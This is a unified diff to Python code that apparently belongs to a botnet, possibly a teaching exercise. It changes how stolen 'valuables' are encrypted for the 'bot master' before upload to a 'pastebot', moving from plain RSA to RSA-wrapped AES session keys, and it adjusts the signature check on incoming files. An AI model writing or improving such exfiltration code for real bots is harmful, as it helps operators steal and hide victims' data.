@@ -1,8 +1,11 @@
 import os
 
+import Crypto.Cipher.PKCS1_v1_5
+import Crypto.Signature.PKCS1_v1_5
+
 from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_v1_5
-from Crypto.Signature import PKCS1_v1_5
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 from Crypto.Hash import MD5
 
 # Instead of storing files on disk,
@@ -21,10 +24,20 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    key_obj = RSA.importKey(encryption_key)
-    cipher_obj = PKCS1_v1_5.new(key_obj)
-    encrypted_data = cipher_obj.encrypt(data)
-    return encrypted_data
+
+    rsa_key = RSA.importKey(encryption_key)
+    rsa_cipher = Crypto.Cipher.PKCS1_v1_5.new(rsa_key)
+    session_key = get_random_bytes(16)
+    iv = get_random_bytes(AES.block_size)
+
+    # Encrypt the session key with RSA
+    encrypted_session_key = rsa_cipher.encrypt(session_key)
+
+    # Encrypt the data with 128-bit AES, using the session key
+    aes_cipher = AES.new(session_key, AES.MODE_CFB, iv)
+    encrypted_data = aes_cipher.encrypt(data)
+
+    return encrypted_session_key + iv + encrypted_data
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -55,7 +68,7 @@ def verify_file(f):
     # Hashing ensures that RSA will be able to verify/decrypt the message
     # (limitation of RSA is that m must be less than n)
     hashed_file = MD5.new(file_contents)
-    sig_scheme = PKCS1_v1_5.new(key_obj)
+    sig_scheme = Crypto.Signature.PKCS1_v1_5.new(key_obj)
 
     # Check if the signature is authentic
     if sig_scheme.verify(hashed_file, signature):
